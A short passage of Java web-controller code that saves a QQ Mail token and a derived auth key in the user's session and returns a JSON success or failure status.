		this.setSessionValue("qqmail_token", qqMailToken);
		String authKey = QQMailUtil.initQQMailAuthKey(qqMailToken, SystemUtil.getCurrentUser());
		this.setSessionValue("qqmail_authKey", authKey);		
		getOutputMsg().put("STATE", "SUCCESS");
		}catch(Exception e){
			getOutputMsg().put("STATE", "FAIL");
			getOutputMsg().put("MSG",e.getMessage());
		}
		outPrint(response, JSONObject.fromObject(getOutputMsg()));
	}
}
